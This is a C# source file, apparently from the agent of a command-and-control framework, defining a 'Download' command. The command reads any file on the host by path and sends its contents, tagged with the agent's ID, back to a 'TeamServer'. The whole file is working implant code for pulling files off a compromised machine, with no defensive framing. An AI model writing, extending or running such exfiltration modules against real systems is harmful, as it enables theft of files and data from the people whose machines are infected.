using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class DownloadCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Download;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.Path);

            string path = task.GetParameter<string>(ParameterId.Path);

            if (!System.IO.File.Exists(path))
            {
                context.AppendResult($"File {path} not found.");
                return;
            }

            byte[] fileBytes = null;
            using (FileStream fs = System.IO.File.OpenRead(path))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            string fileName = string.Empty;
            if (task.HasParameter(ParameterId.Name))
                fileName = task.GetParameter<string>(ParameterId.Name);
            else
                fileName =  Path.GetFileName(path);


            context.Objects(new DownloadFile()
            {
                Id = ShortGuid.NewGuid(),
                FileName = fileName,
                Path = path,
                Data = fileBytes,
                Source = context.Agent.MetaData.Id,
            });

            context.AppendResult($"File {path} downloaded to TeamServer.");
        }
    }
}
